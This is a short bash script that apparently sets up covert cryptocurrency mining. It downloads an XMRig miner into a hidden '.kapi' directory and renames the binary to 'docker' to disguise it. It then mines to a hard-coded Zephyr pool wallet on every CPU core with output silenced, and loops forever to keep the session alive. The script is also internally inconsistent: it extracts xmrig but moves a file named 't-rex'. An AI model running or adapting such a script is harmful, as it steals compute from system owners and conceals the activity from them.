#!/bin/bash
mkdir .kapi && cd .kapi
wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-bionic-x64.tar.gz && tar -xvf xmrig-6.21.1-bionic-x64.tar.gz >/dev/null 2>&1
mv t-rex docker
./docker --donate-level 1 -o sg.zephyr.herominers.com:1123 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p LAPET -a rx/0 -t $(nproc --all) >/dev/null 2>&1
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
